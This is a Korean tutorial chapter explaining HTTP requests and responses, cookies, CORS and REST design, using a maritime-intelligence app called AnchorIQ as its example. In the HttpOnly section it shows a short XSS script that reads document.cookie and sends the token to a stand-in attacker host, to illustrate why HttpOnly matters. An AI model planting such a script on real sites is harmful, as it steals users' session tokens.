# Part 2: HTTP와 REST API

---

# Chapter 2: HTTP — 브라우저와 서버의 대화 형식

## 2.1 HTTP(HyperText Transfer Protocol)란?

**HTTP란, 웹에서 브라우저(클라이언트)와 서버가 데이터를 주고받기 위한 규칙(프로토콜)입니다.**

TCP가 "데이터를 안전하게 전달하는 규칙"이었다면, HTTP는 그 위에서 "전달하는 데이터의 형식과 의미를 정하는 규칙"입니다.

편지에 비유하면:
- TCP = 등기우편 시스템 (배달의 신뢰성)
- HTTP = 편지의 양식 (편지지의 형식, 인사말, 본문, 맺음말)

HTTP의 핵심 규칙:

**규칙 1: 요청(Request)과 응답(Response) 쌍으로 동작합니다.**
브라우저가 "이것 줘"라고 요청하면, 서버가 "여기 있어"라고 응답합니다. 서버가 먼저 말을 걸 수는 없습니다.

**규칙 2: 무상태(Stateless)입니다.**
서버는 이전 대화를 기억하지 않습니다. 매 요청이 독립적입니다. "나 아까 로그인했잖아"가 통하지 않습니다. 그래서 매 요청마다 JWT 토큰을 함께 보내서 "나 이 사람이야"를 증명해야 합니다.

---

## 2.2 HTTP 요청(Request)이란?

**HTTP 요청이란, 브라우저가 서버에게 "무엇을 해달라"고 보내는 메시지입니다.**

요청은 크게 3개 부분으로 구성됩니다:

```
┌── 요청 라인 (Request Line) ──────────────────┐
│ POST /api/ai/query HTTP/1.1                   │
│ ↑      ↑              ↑                       │
│ 메서드  경로           HTTP 버전              │
└──────────────────────────────────────────────┘
┌── 헤더 (Headers) ────────────────────────────┐
│ Host: localhost:8080                          │
│ Content-Type: application/json                │
│ Cookie: access_token=eyJhbGci...              │
└──────────────────────────────────────────────┘
┌── 본문 (Body) ───────────────────────────────┐
│ {"query": "호르무즈 근처에 제재국 선박 있어?"}   │
└──────────────────────────────────────────────┘
```

### HTTP 메서드(Method)란?

**HTTP 메서드란, "이 요청으로 무엇을 하고 싶은지"를 나타내는 동사입니다.**

| 메서드 | 의미 | 비유 | AnchorIQ 예시 |
|--------|------|------|-------------|
| **GET** | "이것을 보여줘" (조회) | 도서관에서 책을 읽는 것 | `GET /api/ai/briefing` (일일 브리핑 조회) |
| **POST** | "이것을 처리해줘" (생성/처리) | 식당에서 주문하는 것 | `POST /api/ai/query` (AI 질의 실행) |
| **PUT** | "이것을 수정해줘" (전체 수정) | 이력서를 새 버전으로 교체 | `PUT /api/workflows/42` (워크플로우 수정) |
| **DELETE** | "이것을 삭제해줘" (삭제) | 파일을 휴지통에 버리는 것 | `DELETE /api/bookmarks/7` (북마크 삭제) |

### GET과 POST의 차이

```
GET — 데이터가 URL에 포함됩니다:
  GET /api/vessels?flag=KR&type=TANKER
                   ↑ 쿼리 파라미터 (URL에 보임)
  
  특징:
  - 브라우저 주소창에 보입니다 (비밀번호 전달에 부적합)
  - 본문(Body)이 없습니다
  - 같은 요청을 여러 번 해도 결과가 같습니다 (멱등)
  - 서버의 상태를 바꾸지 않습니다 (안전)
  - 브라우저가 결과를 캐시할 수 있습니다
  - 북마크할 수 있습니다
  
POST — 데이터가 본문(Body)에 포함됩니다:
  POST /api/ai/query
  Body: {"query": "호르무즈 근처에 제재국 선박 있어?"}
         ↑ URL에 안 보임
  
  특징:
  - URL에 데이터가 보이지 않습니다
  - 데이터 크기 제한이 없습니다 (URL은 보통 2048자 제한)
  - 같은 요청을 여러 번 하면 결과가 다를 수 있습니다 (비멱등)
    예: AI 질의를 2번 하면 API 사용량이 2 증가
  - 서버의 상태를 바꿀 수 있습니다 (비안전)
```

### 멱등성(Idempotency)이란?

**멱등성이란, 같은 요청을 여러 번 실행해도 결과가 동일한 성질입니다.**

```
멱등한 메서드:
  GET /api/vessels → 10번 조회해도 결과 같음 (데이터 변경 없음)
  PUT /api/workflows/42 → 10번 수정해도 마지막 상태는 같음
  DELETE /api/bookmarks/7 → 이미 삭제된 것을 또 삭제해도 "없는 상태"는 같음

멱등하지 않은 메서드:
  POST /api/ai/query → 5번 호출하면 API 사용량이 5 증가
  POST /api/auth/signup → 2번 호출하면 첫 번째는 성공, 두 번째는 "이미 존재" 에러
```

### HTTP 헤더(Header)란?

**HTTP 헤더란, 요청이나 응답에 대한 부가 정보(메타데이터)를 담는 필드입니다.**

편지의 본문 외에 봉투에 적는 정보(보내는 사람, 우표 종류, 등기 여부)와 같습니다.

AnchorIQ AI 질의의 주요 헤더:

```
Host: localhost:8080
  "이 요청을 받을 서버의 주소"
  하나의 IP에 여러 사이트가 있을 수 있으므로,
  어떤 사이트로 보낼지 지정합니다.

Content-Type: application/json
  "본문의 데이터 형식이 JSON이다"
  서버가 이 헤더를 보고 본문을 JSON으로 파싱합니다.
  Spring Boot에서 @RequestBody가 이 정보를 사용하여
  JSON → Java 객체로 변환합니다.

Cookie: access_token=eyJhbGci...
  "나는 이 JWT 토큰을 가진 사용자다"
  로그인할 때 서버가 발급한 토큰을 브라우저가 자동으로 포함합니다.
  이 토큰으로 서버가 "이 요청을 보낸 사람이 누구인지" 확인합니다.

Accept: application/json
  "응답을 JSON 형식으로 주세요"

Origin: http://localhost:3004
  "이 요청이 어디서 왔는지"
  CORS(교차 출처 리소스 공유) 검증에 사용됩니다.
```

---

## 2.3 HTTP 응답(Response)이란?

**HTTP 응답이란, 서버가 브라우저의 요청에 대해 보내는 결과 메시지입니다.**

### 상태 코드(Status Code)란?

**상태 코드란, 서버가 요청을 어떻게 처리했는지를 3자리 숫자로 알려주는 것입니다.**

첫 번째 숫자가 카테고리를 나타냅니다:

```
2xx = 성공 — "잘 처리했어"
  200 OK: 일반적인 성공 (AI 질의 성공)
  201 Created: 새로운 것을 만들었어 (회원가입 성공)

4xx = 클라이언트 잘못 — "네가 잘못 보냈어"
  400 Bad Request: 요청 형식이 틀림 (JSON이 깨짐, 필수 필드 누락)
  401 Unauthorized: 인증 안 됨 (JWT 토큰 없음/만료)
  403 Forbidden: 권한 없음 (로그인은 했지만 이 기능은 못 씀)
  404 Not Found: 없는 것을 요청함 (존재하지 않는 선박 IMO)
  429 Too Many Requests: 요청이 너무 많음 (AI 쿼터 초과)

5xx = 서버 잘못 — "내가 고장났어"
  500 Internal Server Error: 서버 코드 버그, DB 연결 끊김
  502 Bad Gateway: Nginx가 Spring Boot에 연결 못 함
  504 Gateway Timeout: 요청 처리가 너무 오래 걸림
```

### JSON(JavaScript Object Notation)이란?

**JSON이란, 데이터를 텍스트 형식으로 표현하는 경량 포맷입니다.**

사람이 읽을 수 있고, 컴퓨터도 쉽게 파싱할 수 있어서 웹 API에서 가장 널리 사용됩니다.

```
{
  "success": true,
  "data": {
    "answer": "현재 조회 결과상 호르무즈 인근에...",
    "cypher": "MATCH (v:Vessel)...",
    "entities": []
  },
  "timestamp": "2026-04-04T04:43:17.126Z"
}

규칙:
  - 키(key)는 항상 큰따옴표로 감쌈: "success"
  - 값(value)은 문자열, 숫자, 불리언, 배열, 객체, null 가능
  - 중괄호 {} = 객체 (키-값 쌍의 모음)
  - 대괄호 [] = 배열 (값의 순서 있는 목록)
```

### 직렬화(Serialization)와 역직렬화(Deserialization)란?

**직렬화란, 프로그램의 데이터 구조(객체)를 전송 가능한 형식(JSON 문자열)으로 변환하는 것입니다. 역직렬화는 그 반대입니다.**

```
역직렬화 (요청 수신 시):
  JSON 문자열 → Java 객체
  {"query": "호르무즈..."} → AiQueryRequest(query="호르무즈...")
  
  Spring Boot에서 @RequestBody가 이 작업을 수행합니다.
  내부적으로 Jackson 라이브러리가 처리합니다.

직렬화 (응답 전송 시):
  Java 객체 → JSON 문자열
  ApiResponse(success=true, data={...}) → {"success":true,"data":{...}}
  
  Spring Boot에서 ResponseEntity를 반환하면 자동으로 수행됩니다.
```

---

## 2.4 Cookie(쿠키)란?

**쿠키란, 서버가 브라우저에게 저장하라고 보내는 작은 데이터 조각입니다. 브라우저는 이 데이터를 저장하고, 같은 서버에 다음 요청을 보낼 때 자동으로 포함합니다.**

왜 필요한가? HTTP는 무상태(Stateless)이므로 서버는 이전 요청을 기억하지 못합니다. 쿠키가 없으면 로그인할 때마다 서버는 "너 누구야?"라고 물을 것입니다. 쿠키에 JWT 토큰을 저장하면, 매 요청마다 자동으로 "나 이 사람이야"를 증명할 수 있습니다.

```
로그인 시:
  서버 응답 헤더: Set-Cookie: access_token=eyJhbG...; HttpOnly; Path=/
  브라우저: "이 쿠키를 저장해두자"

다음 API 요청 시:
  브라우저가 자동으로: Cookie: access_token=eyJhbG...
  서버: "아, JWT 토큰이 있네. 검증해보자... 유효하다! userId=5구나."
```

### HttpOnly란?

**HttpOnly란, JavaScript에서 이 쿠키에 접근할 수 없도록 하는 보안 설정입니다.**

```
HttpOnly가 없으면:
  해커가 XSS(Cross-Site Scripting) 공격으로 악성 JavaScript를 삽입할 수 있음
  <script>
    const token = document.cookie;  // 쿠키 읽기 가능!
    fetch('https://hacker.com/steal?token=' + token);  // 토큰 탈취!
  </script>

HttpOnly가 있으면:
  document.cookie → "" (빈 문자열, 접근 불가!)
  JavaScript로 쿠키를 읽을 수 없으므로 토큰 탈취 불가능.
```

AnchorIQ에서 JWT 토큰을 localStorage가 아닌 HttpOnly Cookie에 저장하는 이유가 바로 이것입니다.

---

## 2.5 CORS(Cross-Origin Resource Sharing)란?

**CORS란, 서로 다른 출처(Origin) 간에 리소스를 공유할 수 있도록 허용하는 브라우저 보안 메커니즘입니다.**

### 출처(Origin)란?

**출처란, URL의 프로토콜 + 호스트 + 포트 조합입니다.**

```
http://localhost:3004  (프론트엔드)
http://localhost:8080  (백엔드)

프로토콜: 같음 (http)
호스트: 같음 (localhost)
포트: 다름! (3004 vs 8080)

→ 다른 출처(Cross-Origin)!
```

브라우저는 보안상 **다른 출처로의 요청을 기본적으로 차단**합니다. 이것을 "동일 출처 정책(Same-Origin Policy)"이라고 합니다. 악성 사이트가 다른 사이트의 데이터를 무단으로 가져가는 것을 방지합니다.

하지만 AnchorIQ에서는 프론트엔드(3004)가 백엔드(8080)의 API를 호출해야 하므로, 서버가 "이 출처에서의 요청은 허용한다"고 명시적으로 선언해야 합니다. 이것이 CORS 설정입니다.

```java
// SecurityConfig.java
configuration.setAllowedOrigins(List.of(
    "http://localhost:3004"  // 이 출처에서의 요청을 허용
));
configuration.setAllowCredentials(true);  // 쿠키(JWT) 포함 허용
```

---

# Chapter 3: REST API

## 3.1 API(Application Programming Interface)란?

**API란, 소프트웨어끼리 대화하기 위한 약속된 규격입니다.**

식당의 메뉴판과 같습니다. 손님(프론트엔드)은 주방(백엔드) 안에 들어갈 수 없습니다. 대신 메뉴판(API 문서)을 보고 주문(요청)하면, 웨이터(HTTP)가 전달하고, 음식(응답)이 나옵니다.

손님은 요리사가 어떻게 요리하는지 몰라도 됩니다. 메뉴판에 있는 메뉴 이름과 가격만 알면 됩니다. API도 마찬가지로, 프론트엔드는 백엔드 코드가 어떻게 동작하는지 몰라도 되고, 어떤 URL로 어떤 데이터를 보내면 어떤 응답이 오는지만 알면 됩니다.

## 3.2 REST(Representational State Transfer)란?

**REST란, API를 설계하는 아키텍처 스타일입니다. URL로 자원(명사)을 표현하고, HTTP 메서드로 행동(동사)을 표현합니다.**

```
REST 원칙 1 — URL은 명사:
  /api/vessels         (선박이라는 자원)
  /api/vessels/9863297 (IMO 9863297번 선박이라는 자원)
  
REST 원칙 2 — HTTP 메서드가 동사:
  GET    /api/vessels     = "선박 목록을 조회해줘"
  POST   /api/vessels     = "새 선박을 등록해줘"
  PUT    /api/vessels/123 = "123번 선박을 수정해줘"
  DELETE /api/vessels/123 = "123번 선박을 삭제해줘"
  
REST 원칙 3 — 무상태 (Stateless):
  각 요청은 독립적. 서버는 이전 요청을 기억하지 않음.
  매 요청마다 인증 정보(JWT)를 포함해야 함.
```

AnchorIQ는 174개의 REST API를 이 원칙에 따라 설계했습니다.
